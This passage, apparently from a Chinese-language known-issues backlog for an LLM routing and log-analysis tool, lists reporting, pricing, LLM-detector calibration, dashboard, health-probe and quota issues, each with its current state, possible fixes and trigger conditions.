- **第三处表现（2026-09-12 review）**：跨天挂机会话（同一 lineage 累积 48 天墙钟、0 工具调用）在 journey 详情页与索引行原样呈现「Agent 侧执行时间 4155249.8s」，无任何退化/挂机旗帜，且与真实短任务在重复任务聚类里并列比较。与本条同根因（时间归因无上限）；呈现层补法：AgentExec ≈ 墙钟且工具调用为 0（或时长超阈值）时，在指标表与索引行加「⚠ 疑似挂机/指标退化」旗帜。

#### 2.58 [低] 定价覆盖与溯源的四个已知边界

报表成本章四张表的四个已知口径边界，同源、同一批做才划算——都需要把解析结果的元信息从 `pricing.Resolve` 一路穿到 report 的行结构。

- **(a) 定价表覆盖不到的模型，其成本永远不进任何合计**：合计只含解析出费率的行，表下注明「合计不含 N/M 天（个模型/端点/客户端）」；未定价行仍渲染、成本列写 `-`（不是 0，也不是整行消失）。这是数据缺口不是呈现缺口——三张表都查不到的模型，其流量成本就是未知。**缓解**：厂商优先级消歧 + curated 别名把标准表覆盖面拉满；带 org/路径前缀的聚合商模型名经 `pricing.ModelBasename` 兜底与裸名同解析（见 §1.2）；剩余缺口由用户在对应 provider 的 `pricing.rates`/`pricing.aliases` 自补，或贡献进 `standard_price_curated.yaml`。`vmr check` 在表龄超 60 天时提示刷新。**框架只保证查得到就用得上、查不到就说不知道**，无代码方案。
- **(b) 费率缺分量时按 0 计价，只在汇总层披露，不逐行标注**：`pricing.Rate.Cost` 把 nil 分量按 0 计价（防御性下限），`EndpointRow.CostRateIncomplete` + `IncompleteRateNote` 汇总提示「有 N 个端点的单价缺分量」，但具体哪几行、缺哪一项、少算多少，行上看不出。**触发条件**：主力模型的厂商长期不公布缓存价，而账号缓存命中率又高。
- **(c) 费率溯源只到聚合级，单行看不出走的是哪一层**：`report.Pricing` 摘要只给「本次用了哪些定价来源」的总数；单行 `$` 看不出它走的是标准表、账号覆盖，还是**厂商优先级替代**（一个转售 provider 用了第一方刊例价）。**缓解**：该章免责声明写明整章是「按量计费等价成本、按第一方刊例价」；`vmr check` 的 `pricing_table` 行显示别名条数。**触发条件**：读者需要逐行判断某个金额可不可信。
- **(d) 按客户端表的合计低于其它三张表，差额随「无 client_key 流量占比」漂移**：按日期/模型/端点三张覆盖全部记录，按客户端那张只覆盖解析出 `client_key` 的记录（`internal/report/cost.go` 的 `accumulateCost` 对 `rc.clientKey == ""` 直接跳过 `byClient` 累加）——auth 关闭、未鉴权、本地直连等场景产生的记录压根不成行。这不是一个可以钉死的常量：差额占比就是「无 client_key 记录成本 / 总成本」，早期小规模/单一鉴权来源语料测得约 0.002%，2026-09-11 review 用 44 份真实生产日志（含未鉴权/本地调用流量）测得 7.26%（$14.90/2158 条）——两者都真实，只是语料的鉴权来源构成不同，不代表旧数字错了或新数字更权威。四个合计都是各自表内行的诚实求和，没有哪个假装是「全局总额」。**可能方案（batch-1，需动 golden fixture）**：`accumulateCost` 不再对空 `client_key` 直接跳过，而是聚入一个固定的 `(no client_key)` 伪 `ClientRow` 桶，使四表相加自然一致。**触发条件**：已触发（真实语料已实测到两位数百分比缺口），排入批次 1。

#### 2.64 [低] 「上下文有效利用率」在语料级呈现双峰退化

- **现状**：`internal/journey/metrics.go` 计算的 Context Utilization 在实际语料中高度双峰退化：约两成样本值为 0（无工具调用或单轮任务），约三成为 1.0（全工具结果均被后续轮次引用），中间值稀疏。导致「均值 70% / 中位数 95%」缺乏统计区分度，看板的「100%」亦难提供有效洞察。
- **当前缓解**：`-benchmark` 统计时需结合分布形状（P10/P50/P90 及两端样本数）共同解读；暂不重定义指标语义以维护 v1-complete 稳定性。
- **可能方案**：细化有效引用粒度（如按实体引用率加权或按 token 深度衰减）或按任务类别（含/不含工具调用）分桶展示。
- **触发条件**：后续版本计划重构行为指标语义时统一评估。

#### 2.67 [低] Anthropic 侧的 usage 侧别判定对不吐 `message_start` 类型标记的兼容网关 fail-open

- **现状**：`respnorm` 按 SSE 事件分别记录 in/out 两侧的 usage 是否见过（截断流不再把占位 `output_tokens≈1` 当精确值计费）。侧别判定依赖事件里的 `"type":"message_start"` 标记——含该标记的事件只记 in 侧。
- **边界**：不吐这个标记的 anthropic 兼容网关退回通用判定（占位 Out=1 记为 out 侧见过），即该形态下回到修复前的行为。刻意 fail-open：宁可退回旧行为，也不因为识别不出网关方言就把整条流判成无 usage。

#### 2.68 [低，登记待触发] crosscheck 夹具没有 body-sniffed 的 compaction 记录

- **现状**：`cmd/vmr/cmd_journey_report_crosscheck_test.go` 的夹具里没有 summarization（compaction）请求，因此「report 与 journey 对同一条 compaction 记录渲染逐字节相同的 detail 页」在该端到端测试里没有直擦形态的覆盖——实际由 `internal/report/session_compaction_manifest_test.go` 加指纹机制（`renderFingerprint` 折入 m/prev 身份）间接保证。
- **触发条件**：语料出现真实的 compaction 记录后，往 crosscheck 夹具补一条 body-sniffed summarization 记录。在那之前不构成已知失真——两条直接测试已钉住机制本身。

#### 2.70 [低，登记待触发] `buildRec2` 的 (path, line) join 依赖审计日志追加不变性

- **现状**：`internal/report/recextract.go` 把解析缓存的 `recordFacts` 与会话分析的 `ReqInfo` 按 (path, line) 配对。审计日志是追加型的（压缩轮转生成新 path、哈希变化自然 miss），常规运维下两侧永不错位；但手工编辑/拼接历史日志会让同一 (path, line) 指向不同记录，配错完全静默。
- **可能方案**：join 前对 `rf.TS` 与 `ri.TS` 做阈值校验（如差 > 1s 记 warning 并跳过 join）。
- **触发条件**：出现「对已归档日志做手工编辑」的运维形态，或用户报告无法解释的指标错乱。在那之前这是加固项，不是缺陷。

#### 2.141 [低] §7 工具形态的「实际调用 N」与「调用过的工具（M 个）」计数矛盾

- **现状**：`macro/context-efficiency.json` 的 `tools[].distinct_called` 只统计**命中 declared 集合**的被调用工具，而 `calls` map 与 Markdown 详情清单包含**声明外被调用**的工具（如 `NO_REPLY`、路径形态的工具名）。同一形态的头行写「实际调用 14 个」、清单列 16 个——读者用 14 + never_called 32 = 46 对账时对不上。2026-09-12 review 实测 3 个形态命中（tools:46 / tools:2 / tools:4）。
- **可能方案**：`distinct_called` 改计全部 calls 键；或在清单中对声明外工具加「未声明」标注并写明计数口径。
- **触发条件**：随手可修；与 §2.129 同批渲染层改动时一并做。

#### 2.142 [低] §2.5 账户表的「成功率」（请求级）与「错误率」（attempt 级）同表并列且无口径说明

- **现状**：`ProviderRow.SuccessRate = RequestsOK/Requests`（请求级：failover 恢复也算成功），`ErrorRate = failed/attempts`（attempt 级）。全量账户行呈现「成功率 100.0% | 错误率 5.3%」的组合——两个数字各自正确、分母不同，并排读起来自相矛盾，且表内无脚注区分。2026-09-12 review 全量语料实测 26 个账户行全部如此。
- **可能方案**：表头或脚注注明两列口径（「成功率含 failover 恢复（请求级）」/「错误率按尝试计」）。
- **触发条件**：随手可修（i18n 脚注一行）。

#### 2.143 [低] §1 按模型缓存效率表对零 usage 样本渲染 0.0%（missing is not zero）

- **现状**：无任何 usage 数据的模型行（实测 fast / openai-responses / claude，1–3 个请求、0 token），JSON 侧 `cache_efficiency` 为空，Markdown 侧渲染成 `0.0%`，无 `¹`/low-n 标记；同一批模型在 §4 延迟表渲染 `-`（n=0）。违反「缺数据不伪装成零」的既定纪律（§0 成本列、§2 未定价行均按此处理）。
- **可能方案**：与 §4 对齐，`TokensIn == 0` 时渲染 `-`。
- **触发条件**：渲染层一行判断，随手可修。

#### 2.144 [低] §6.6 端点性价比的成本/1M out 无 low-n 防护

- **现状**：微小样本端点的「成本/1M out」按 cost/out_tokens 直除，实测渲染出 `$4432.8750`（4 个成功请求、24 输出 token）这类荒谬比值，且该表不套用 ⚠️low-n 标记（§3/§4 的同源机制没接到这张表）。脚注只说「用于横向比价」，读者扫表仍会把离群值当真实单价。
- **可能方案**：out_tokens 低于阈值（如 < 10K）时该列渲染 `-` 或加 low-n 标记；与 §2.64 的「按样本量诚实呈现」同型。
- **触发条件**：随手可修。

### C. 分析半区 · LLM 解读层校准

#### 2.18 [中] 六个 LLM 语义判别器尚未完成完整黄金样本校准

- **现状**：`internal/journey/llm_findings.go` 六个判别器已实现、单测覆盖、且用 `_eval/calibrate_p1b.go` 对真实生产日志跑过真实模型验证（6 个真实 Journey 上机械核验 Evidence Anchor 有效率 100%，人工抽查合理）。但不是正式合入门禁——那需 30~50 个 Journey、每模块 ≥6 正/负例的系统性黄金样本集 + 人工标注 Ground Truth 算真实 Precision/Recall。
- **为什么待定**：黄金样本挑选与人工标注是需实际投入时间的判断性工作，无法自动化；当前抽样规模下无需立即处理的误报模式，不构成阻塞。`_eval/calibrate_p1b.go` 已是可直接复用的校准工具，扩大 `-input`/`-limit` 即可推进——**成本在人力时间，不在代码**。

#### 2.145 [中] goal_drift 判定不聚合任务切换轮的用户授权消息，HIGH 置信度头条 Finding 被同文件证据证伪

- **现状**：LLM 判别器/解读层对 goal_drift 的判定只看初始根目标与 Step 行为，不把决策脊柱中**后续任务切换轮的用户指令**纳入。2026-09-12 review 旗舰样本（365 轮）实测：用户在 t04 明确下达「implement 建议 1…」（授权实施），Agent 回复「收到，开始实施」——LLM 把这条回复当作 Agent 擅自越界的证据，产出全篇唯一一条 HIGH 置信度的 goal_drift Finding 并扩写成 LLM 解读的根因叙事。同文件 t-标题即是反证，读者一旦核对即对整层 [AI推测] 失去信任。
- **可能方案**：goal_drift 判定的证据包必须含全部任务切换轮的用户指令摘要；检测到授权性用户消息时降级置信度或显式标注「存在反证：tNN 用户已授权」。应并入 §2.18 的黄金样本校准范围（该样本即现成负例）。
- **触发条件**：已触发（真实语料复现）；与 §2.18 校准工作同批做。

#### 2.146 [中] LLM 解读自由文本中的数字/Step 引用与同文件规则指标矛盾，无行内交叉校验

- **现状**：§1.4 的锚点校验与 StepSeq 范围守卫只作用于**结构化 Finding 字段**；LLM 解读正文是自由文本，不受守卫。2026-09-12 review 实测同一文件出现「耗时 1974 秒模型执行」（实为 Agent 侧执行时间，模型时间 5325.7s）、「10 次 compaction」（规则指标 2）、「Step 1231」（全篇仅 365 步）——顶部有「可能有误」总免责，但读者最细读的叙事层与同文件权威指标冲突时没有任何行内 ⚠。
- **可能方案**：解读生成后对正文中出现的数值与 Step 序号做规则层交叉校验，冲突处行内标注「⚠ 与规则指标冲突：实际 N」；把 §1.4 的 StepSeq 范围守卫延伸到正文引用（超范围的直接剔除）。
- **触发条件**：与 §2.18 / §2.145 同批评估；纯后处理，不动 prompt。

#### 2.147 [中] unverified_entity_reference 的证伪判定噪声率高，实体抽取存在换行残渣

- **现状**：判定把「同一次工具输出中出现过 not-found 字样」当作实体被证伪的依据，于是 Go 标识符（`ErrRateLimit`/`strings.Contains`/`testing.T`）、API 路径（`/v1/chat/completions`）、echo 回显、真实存在的文件都被标成「已被证伪的实体」；单个 journey 实测命中 77 条，Findings 节被明显荒谬的条目淹没，抽验两条即失去对整节的信任。另有实体抽取把换行符压成字面 `n` 的残渣（如 `n/usr/bin/`）。行内虽有「仅基于字面标记识别，不代表确认幻觉」的括注，但「已被证伪」的措辞强度与实际证据不匹配。
- **可能方案**：证伪限定为「该实体自身出现在 not-found 报错位置」；过滤标识符/路径形态实体；修换行残渣；措辞降级为「疑似未验证引用」。
- **触发条件**：已触发（真实语料复现）；与 §2.18 校准同批。

### D. 分析半区 · 展示与产出契约

#### 2.6 [低] 报表账户消耗表的标记符号已达四个

- **现状**：`⭐` 超额度 / `‡` 配置变更 / `†` 无时间交集 / `◇` 部分流量未计价，各配一条按需渲染脚注。信息都必要，但四个符号叠一张表可能已到「标记多到没人看脚注」的临界。
- **为什么待定**：主观展示密度判断，四个标记都按需渲染，健康报表一个都不出现。真实报表读起来觉得吵了再动（`◇` 是最可能降级为纯 JSON 字段的候选）。

#### 2.93 [低，风险面已收窄] 跨运行累积产物的 LLM 原文语言混排（render-only 重渲染时）

- **现状**：R1（`internal/journey`/`internal/report` 数据产品语言中立化）落地后，`-render-only -lang <换语言>` 已是受支持、无需全量重跑的正常操作——`compares/*.json`、`journeys/details/j-<id>.json` 里规则派生的叙述（`Finding.Source` 留空）不再携带任何语言，`renderAllFromDisk` 用请求的新语言重渲染时对这部分内容永远正确、不再混排。**剩下唯一仍可能混排的**是 LLM 原文（`llm_interpretation.text`、`llm_findings[]` 里 `Source == "llm_inferred"` 的条目）——这部分文本是模型在生成时那次调用的语言产物，无法重新推导，`-render-only` 换语言时只能原样保留，并用 `llm_lang` 字段如实标注它的真实语言。同一份文档因此可能出现「结构性内容随 `-lang` 正确切换，LLM 解读段落仍是上次调用时的语言」——这是 R1 的 LLM 原文豁免的直接后果，不是遗留 bug。
- **为什么标为「已收窄」而不是「已解决」**：LLM 原文混排本身不可解——除非重新调用一次 LLM（`-llm-addr`），没有别的办法在不产生新调用的前提下把已生成的模型原文翻译成另一种语言。`llm_lang` 字段已经把这种情况变成可判定、可告知的事实，而不是静默的语言错乱。
- **触发条件**：真实需求出现「同一份 journey/compare 文档，结构文字与 LLM 解读段落语言不一致」的可读性投诉时，可考虑在 Markdown 的 LLM 小节前加一条「本节生成于 {llm_lang}」的提示行——渲染层已经有 `llm_lang` 可读，纯展示层改动，不涉及数据产品。

#### 2.94 [低，登记待办] 看板 `wireHashReload` 用 `location.reload()` 解决路由刷新

- **现状**：`journey-viewer.html` 内用户在同页切换 `#data=` 链接（如候选列表点开某个任务）时，`common.js` 的 `wireHashReload` 监听 `hashchange` 后直接 `location.reload()` 整页重载——功能可用，但销毁了滚动位置、筛选器状态与展开状态。
- **根因**：骨架页早期是一次性 IIFE 绑定生命周期，没有组件化「数据拉取 → DOM 局部清空与重绘」的函数。
- **可能方案**：把各页数据加载与渲染封装为显式的无状态渲染函数（如 `renderJourneyViewer(data)`），`hashchange` 时仅局部 fetch + 内存内替换 DOM 节点。需重构两到三个页面的生命周期。
- **第二处症状（2026-09-12 review）**：journey-viewer 的 Touched Artifacts 表内 `#step-N` 页内锚点也被同一 `wireHashReload` 劫持——点击后整页 reload，异步数据未就绪导致 fragment 定位静默失败、滚动位置丢失。render 函数化重构应一并覆盖（`wireHashReload` 只对 `#data=` 前缀的 hash 变更 reload，页内锚点走 `scrollIntoView`）。
- **触发条件**：作为看板体验专项排期处理；在那之前 reload 行为可接受。

#### 2.95 [低，登记待办] 看板 chrome 的中英双语化

- **现状**：`-lang zh` 产出的 Markdown 全中文，但同目录下看板骨架页的导航、表头、按钮、图例固定英文。裁决理由见 §1.5「看板骨架页的 chrome 是英文单版」——**这不是 bug**，本条只是把改造登记为排期待办。
- **可能方案**：`common.js` 内置轻量中英词典（数十词条），骨架页写入时按产物语言注入 `window.__LANG`，`initDashboard()` 阶段对带 `data-i18n` 属性的静态文本节点做替换；无需多套 HTML。约 1 人天。

#### 2.73 [低-中，暂不做] LLM 自由文本的 `<`/`>` 未净化即进 `.md` 产物

- **现状**：`sanitizeMDStruct`（`internal/journey/llm.go`）只处理 Markdown **结构**破坏（反引号/竖线/行首标记），不处理 `<`/`>`。LLM 判别器输出的类 HTML 片段会原样进入 `.md` 文件。
- **为什么暂不做**：`.md` 产物没有 HTML 渲染面（看板骨架页消费的是 JSON 切片，不渲染 Markdown），Markdown 阅读器对裸 `<...>` 的降级仅是显示瑕疵。
- **触发条件**：产物开始被 web 化渲染，或出现把 `.md` 直接转 HTML 的新消费方——届时在转换层做 HTML 转义，而不是提前在数据层碰文本。
- **这条原则现在与仓库其余部分一致，不再方向相反**：本节上一条「Markdown 结构转义做在序列化时」落地后，本条"HTML 转义该做在转换层"的判断与之同向——两者都是"转义是投影层的职责，不提前在数据层碰文本"。本条仍然不做，只是触发条件（产物 web 化）尚未出现，不是原则本身有分歧。

#### 2.7 [低] 报表成本表结构化透传 `CostEstimateEst`

- **现状**：Markdown 口径提示脚注已闭环。进一步的结构化透传要给 `Row`/`ClientRow` 补 `CostEstimateEst`、改 `rows.go`/`accumulateCost`/渲染层三处，并再次改 macro 切片的形状。
- **为什么待定**：无明确外部程序消费需求前遵循 YAGNI。

#### 2.22 [低，决定不做] `chatmsg.ToolCallList` 未覆盖 Responses API 的 `function_call` 形状

- **现状**：结果侧（`ToolResultList`）**已经覆盖** Responses 的 `function_call_output`（显式 `m["type"] == "function_call_output"` 分支，`chatmsg.Messages` 也能把它渲染成人读文本）；仍未覆盖的只是调用侧——`ToolCallList` 的注释自称只解析 `openai-completions` 的 `assistant-message tool_calls` 数组一种形状，Responses 的 `function_call` Item 未被任何结构化提取覆盖。纯 Responses API 流量下脊柱不展示工具调用、三个 Finding 检测器无证据、`j-<id>.json` 的 `tool_calls` 会静默报告「这一步没有工具调用」。
- **决定不做**：真实语料按 `protocol` 统计 `openai-responses` **0 条 / 0.0%**——一次都没触发过。**触发条件（量化）**：任意一次 `vmr analyze` 的 `requests/index.json` 出现 `protocol == "openai-responses"` 的记录，即重新排期。

#### 2.148 [低] journeys/index.json 行字段完整性随「最后一次写入它的运行形态」漂移

- **现状**：噪声类候选（heartbeat/poll）的 `tasks`/`net_working_ms` 只在**聚焦模式**（`-journey`/`-compare` 收尾的 saveJourneyIndex）写入时填充；默认套件写入的同名行缺这两个字段，Markdown 渲染成 `—`。同一语料的两份产物因此内容不对称：2026-09-12 review 实测 121 行 zh（聚焦运行后）有任务数、en（纯默认套件）同行显示 `—`，双语对照呈现系统性差异。
- **可能方案**：两处 index 写入路径统一字段填充口径（默认套件对未渲染候选也算 task 段，或两处都留空）。
- **触发条件**：与 §2.93 同族的「跨调用累积产物漂移」，登记防回归；出现真实跨目录/跨语言对比用户时优先。

#### 2.149 [低] LLM 推测条目混入「疑似问题」候选清单，清单完整性随运行历史变化

- **现状**：`-journey -llm-addr` 产出的 [AI推测] Finding 与规则 Finding 混在同一「疑似问题」节（仅靠 `[AI推测 · 置信度]` 前缀区分）。LLM 解读是单次运行、单语言的一次性产物：同一 journey 的 zh 文件（跑过 LLM）与 en 文件（没跑）候选清单条目数不同（实测 zh 多 2 类、en 对应类别 0 命中）——清单自称完整候选，跨语言/跨运行读者得出不同风险结论。
- **可能方案**：把 LLM 推测条目从候选清单移到「LLM 解读」节内独立小节；或清单头注明「含 N 条单次 LLM 推测，未跑 LLM 的渲染不含」。
- **触发条件**：与 §2.93（语言混排）同族；出现真实跨语言对比用户时优先。

#### 2.150 [低] 同锚点同起点的多 Journey 候选无「同会话」标注，索引/聚类按独立执行呈现

- **现状**：同一 SessKey 锚点、同一 start 时间戳的多个候选（实测同 20260716T113526 锚点两个候选、20260719T211051 / 20260804T123713 / 20260820T011845 同型）在索引明细表与重复任务聚类里各占一行，无任何「同会话增量快照/同源分叉」标注——读者会把「净工作 2494.7s vs 7299.8s」当同一任务的两次独立尝试对比，虚增候选数且对比失真。`-compare` 对这类对偶反而工作良好（同会话分叉对比），问题只在索引/聚类的呈现语义。
- **可能方案**：index 行与聚类行对「同 start 同标题」的候选加「同会话快照（截至 HH:MM）」标注或折叠合并；compares/index 不受影响。
- **触发条件**：与 §2.130 的索引改造同批做。

#### 2.151 [低] macro-dashboard 单切片加载失败静默停留 Loading，错误态/降级呈现缺失

- **现状**：`macro-dashboard.html` 的 `loadAll()` 用 `Promise.allSettled` 包五个切片 loader——allSettled 永不 reject，外层 banner-err 不可达；任一切片 404/损坏时对应 tab 停在初始 Loading/空白，无提示。同族小项：Highlights 区把 Markdown 星号原样当 HTML 渲染（`**bold**` 裸露）。
- **可能方案**：每 loader 单独 catch 并渲染错误/空态文案；空数据给一句「本套件未生成此产物」。
- **触发条件**：看板体验专项（§2.94/§2.95/§2.130 同批）。

#### 2.152 [低] request-browser 时间筛选要求输入 epoch 毫秒，与展示的 ts_display 格式脱节

- **现状**：Time From/To 输入框按 `Number()` 与 `r.TSNum` 比较，页面展示的却是 `2026-07-14 00:07:58`；无日期选择器、无数据实际时间范围提示——手输正确时间窗几乎不可能，筛选器事实上不可用。
- **可能方案**：改 `datetime-local` 输入，加载后回填数据 min/max。
- **触发条件**：看板体验专项同批。

#### 2.126 [低，决定不做] 遗留的 OpenAI `function_call`/`role:function` 形状被静默忽略

- **现状**：`internal/chatmsg/messages.go` 的 `Messages()` 只读现行 `tool_calls`/`role:"tool"` 两种当前形状；2023 年被 Chat Completions 弃用的旧式顶层 `function_call` 字段与 `role:"function"` 消息未被识别——后者仍会被当普通消息渲染（不丢消息），但其配对的旧式调用侧完全不识别，工具配对检查覆盖不到。
- **决定不做**：与 §2.22 同型的量化证据——44 份、15,946 条真实生产语料全量 grep `"function_call"` 与 `"role":"function"` **均命中 0 条**。**触发条件（量化）**：语料出现一条裸 `function_call` 字段或 `role:"function"` 消息，即重新排期。

### E. 路由半区 · 配额与请求路径

#### 2.17 [中] `imgprep` 解码闸门按「防炸弹」设定，其内存上界与单请求内存预算差一个数量级

- **现状**：`processImage` 在 `image.Decode` 前用 `image.DecodeConfig` 只读头取宽高，声明尺寸 > `maxDecodePixels`（代码值 16MP）直接放弃降采样原样透传。**闸门存在且工作正常**，目的是拦解压炸弹。问题在阈值量纲：16MP 按 RGBA 约 64MB/次解码，而 UserGuide「单请求内存预算」核算的是 ~32MB/请求——两个数字各自都对，回答的不是同一个问题（「多大算恶意」vs「一个请求该占多少」）。图片逐张解码逐张释放，多图不累加。
- **可能方案**：为内存预算再设一道更低的、可配置的闸门。
- **为什么待定**：够到闸门需刻意构造，正常截图/照片低一到两个数量级，无实测显示真实负载下造成过内存问题；且方案自带「用账单换内存」的取舍，不能替用户默认决定。零风险的一半（UserGuide/.zh + `config.example` 注释写明这段峰值由像素数决定、逐张释放）已落地。

#### 2.52 [低] 虚拟模型级预算硬闸未做

- **现状**：quota 的 gate/bucket 是「配速」——从不拒绝请求，只在同优先级梯队内重排端点。硬闸要的是**硬急停**：进死循环的 agent 触顶后请求被**明确拒绝**（可解析错误，绝不静默降级到便宜模型），每日零点 + 进程重启重置、不引入持久化。两者目标不同——配速降低「跑爆某套餐」概率，硬闸给「一夜烧光」设确定性上限。
- **为什么待定**：用户 hold。真要做需一个独立的内存态机制（仿 `health.Registry`，请求入口查一次），不是拧 quota 旋钮能得到的。

#### 2.85 [低] 半开恢复的深度退避解除策略：多候选同时半开的场景未覆盖

- **已落地的部分**：`buildCandidates`（经 `healthFilter`，`internal/router/candidates.go`）带 last-resort——候选全空（`healthOK` 为空）且存在至少一个半开（cooldown 已过期、仅 `fails>0`）端点时，释放其中退避最浅的一个（`ReportNeutral`，终态释放 `Classify` 刚占的 single-flight 名额，不动 `fails`/cooldown）作为本轮真实候选，走和普通端点完全相同的 `tryOne`/`Acquire`/`ReportSuccess` 路径——真实成功直接清零 `fails`，不再需要多轮探针衰减。同一轮里其余半开端点不受影响，仍正常派后台探针。与 `ctxFallback`（「估计值不该清空非空候选集，交给一次真实尝试去判断」）是同一条设计原则在健康过滤上的延伸，`X-VMR-Route-Reason` 新增 `health_fallback=1` 标记可观测。
- **边界（有意的取舍，非缺陷）**：若被释放的端点其实仍未恢复，这次真实请求要等到 `response_header` 超时（默认 120s，可配）才失败，而不是秒回 503——因为这条路径复用的是真实流量的 upstream client，不是 `timeouts.probe` 那条专门收窄过的探针路径。只在「反正所有候选都会 503」的极端场景触发，不影响任何本来能成功的请求；`internal/server/active_probe_test.go` 的 `TestActiveProbe_HalfOpenEndpointServedAsLastResort` 钉死这个边界。
- **残留场景（决定不做）**：多候选同时半开时 last-resort 只释放退避最浅的一个；若它不巧仍未恢复，本轮吃满 `response_header` 超时才失败，不会转去试另一个可能已恢复的半开端点。曾提案「探针成功 1 次即放该端点回常规路由（保留 `fails` 深度，后续真实请求失败则在原深度继续退避、成功则清零）」让这些端点提前备好。不做的三个理由：① 直接违背 §1.1 已钉死的「探针成功只做衰减（`fails--`），真实流量成功才清零」——探针是 `max_tokens=300` 的小请求，用它发常规路由资格正是 429→冷却→探针成功→满额流量→429 循环的成因；② 要横跨多个请求累积信任、自带真实 flap 风险，需要独立设计草案 + 回摆回归测试；③ 只在「反正本轮所有候选都会失败」的极端场景才有差别，不拖慢任何本可成功的请求。**触发条件（触发即重估）**：真实生产报告显示这个二阶场景确实把本可成功的请求拖垮了（多候选半开 + 释放的那个未恢复 + 等满超时），而非仅理论存在。

#### 2.86 [低，需先设计] `respnorm` 初始 `modeUndecided` 扣留保活帧，慢/排队上游下客户端可能读超时

- **现状**：SSE 流初始处于 `modeUndecided`（为侦测 MiniMax 的 inline-think 形态），首个「payload-bearing」事件（`content`/`text` 非 `<think>` 开头，或 `tool_calls`/`partial_json`，或专用 `reasoning_content`/`thinking` 字段）到达前，所有事件——含 `message_start`、role marker、`event: ping` 保活帧——全部囤在 `s.pending`。`bufferedCap` 几十秒也到不了（ping ~30B/个）。
- **影响面**：常见情况首个 content delta 在 role 后几十 ms 到达、扣留可忽略；Anthropic extended thinking 的 `thinking_delta` 立即放行。**窄场景**：上游排队 / 慢推理模型在 `message_start` 后长时间只发 ping、无任何 content/thinking/tool delta，超过客户端读超时。
- **可能方案**（触及核心四态机，需评估与 buffered/opaque/截断三分支的交互 + 完整回归）：在 `decide()` / `ingest` 的 undecided/buffered 路径识别保活帧（`event: ping`、SSE 注释行 `:`）并立即旁路 `s.out`，不参与 decide（ping 无 content、无 model 字段，早发对 SSE 语义无害，与 MiniMax buffered 不共存）。
- **触发条件**：真实用户报告「用某慢上游时流式响应假死后被客户端超时切断」。

#### 2.99 [低，登记待评估] 灰区振荡：探针放行把「慢而未死」端点送回常规池首选位，新流量反复撞满超时

- **现状与根因**：恢复探针（`max_tokens=300` 回显请求）对「慢/过载但未死」上游的通过率系统性高于真实大请求，连续探针成功把 `fails` 衰减到 0 后端点回到常规池的**配置原优先级**。对灰区上游构成池级振荡：新流量（无 sticky 指针者按配置序路由）撞满 `response_header` 超时 → failover 到别的候选成功且 sticky 随之迁移（同会话不再回撞）→ A 冷却到期探针过 → 回池原位 → 下一个新会话又先撞 A。探针撞墙最多烧 `timeouts.probe`（15s），真实流量撞墙烧满 `response_header`（默认 120s）——代价在后者。
- **已落地的缓解（治标）**：transient 首档 2s→5s（2026-08，`internal/health/health.go`），振荡频率压到 1/2.5，不改变循环结构。
- **候选方案（治本，改动接近参数级）**：探针只衰减到 `fails==1`（`ReportProbeSuccess` 改 `if s.fails > 1 { s.fails-- }`），`Classify` 对 `fails==1` 且冷却已过的端点直接放行真实请求——该请求即终审：成功清零回池，失败 `fails=2` 进更深冷却。效果：灰区端点永不回到常规池首选位，终审失败逐轮加深冷却，单位时间烧掉的用户超时严格更少；同时让 §1.1 的「没有真实成功就永不归零」从交替语境保证升级为字面保证（当前纯探针序列可衰减到 0，`ReportProbeSuccess` 包注释与之一致）。Envoy outlier detection 的「弹出到期由真实流量终审」是同一形态。
- **代价与需要改的不变式**：①「真实流量永不接触半开端点」缩窄为「永不接触 `fails>1` 的半开」，`internal/server/active_probe_test.go`、`internal/health/health_test.go` 一批断言与 `ReportProbeSuccess` 包注释要同步改写；②终审请求吃满 `response_header` 超时从 last-resort 专属形态变为深度 1 放行的常规行为，需接受或为终审尝试设收窄的 header 预算（独立决策点）；③单端点配置下深度 1 放行即 last-resort，行为不变。与 §2.85 曾否决的「探针成功 1 次即放行」提案的区别：放行请求本身定义为终审（失败加深、成功清零），且只在深度 1 触发——探针仍承担 1→N 的全部验证工作，不重复 §2.85 反对的「弱信号换满额路由资格」。
- **已否决的替代**：保真探针（按最近失败请求体量放大探针）——探针按 token 计费，每次恢复烧真实成本，`timeouts.probe` 预算也要跟着涨。间隔 soak（K 次成功且相邻间隔 ≥10s）只降概率不根除，留作方案 A 落地后仍有残留时的补充。按请求规模软降级（超时类失败不冷却、大请求降权小请求照常）是语义上更精确的长期模型，与 `ROADMAP` 的 Latency 维度同源，不在本条范围。
- **触发条件（触发即实施）**：先用首档 5s 观察——日志/审计显示同一端点在短间隔内规律性复现「失败→探针通过→再失败」（如同一端点数分钟内多次 `cooldown=` 记录、`X-VMR-Failover` 反复出现同一对端点），再决定是否按候选方案实施。

#### 2.48 [低] 错误分类词表的长期形态：端点级 quirk 统一模块未做

- **现状**：vendor 知识散在 `DefaultClassify` 的全局词表里（`contentHint`/`contextLimitHint`/`upstreamHint`/`vendorQuirkHint`/`authHint`）。已知厂商专属误判已由 `ErrQuirk` 类 + 词条修复覆盖（见 §1.1），词表之间尚未互相干扰。
- **可能方案（升级时直接可用）**：每 vendor 一个编译期注册的 quirk profile，按 **model glob** 匹配（不按 provider 名——用户自起名，改名即静默失效），字段含 marker 表 / 建议分类 / sticky 策略；`DefaultClassify` 保留为兜底。**附带**：quirk 命中时对 sticky 会话降级（清粘性/降权），消除中毒会话每轮 ~1–2s 的重复失败往返。
- **触发条件**：全局词表增长到出现互相干扰/误命中，或 sticky 重复往返在真实负载中可观测地拖慢中毒会话。

#### 2.14 [低] 滑动时间窗（Rolling Window）限流模型

- **现状**：`internal/quota/period.go` 是日历对齐的惰性周期重置，短 tumbling 窗（如 `every: 5h`）按周期近似。真正的滑动窗需要平滑计数器（Ring）。
- **性质**：功能演进，不是缺陷——当前近似对目标场景（月度/日度 token plan）够用；滚动窗类套餐（Claude Code Pro/Max）的瞬时拒绝由健康状态机的冷却/退避兜底。**除非实测到某厂商套餐的密集 429 冲击，否则不做**——不在 README / Strategy 里当卖点讲。

#### 2.10 [低] 审计落盘的 `write` syscall 在全局锁内

- **现状**：`audit.Logger.Write` 的 JSON 编码已用 `sync.Pool` 移到锁外，但写文件的系统调用仍在全局互斥锁内。
- **可能方案**：带缓冲通道 + 单独写协程。
- **为什么待定**：异步队列要处理背压（丢弃 vs 阻塞）与优雅关停等待；当前直接写入未构成瓶颈。

#### 2.9 [低] 探针请求绕过审计日志

- **现状**：`internal/router/probe.go` 的健康探活请求不写 `audit.Record`，`vmr analyze` 看不到探活消耗。
- **为什么待定**：探活消耗极低；且需先明确探针流量在报表中的呈现口径，避免污染业务 SLO 统计。

#### 2.74 [低] `attachmentSpans` 对大 body 重复扫描

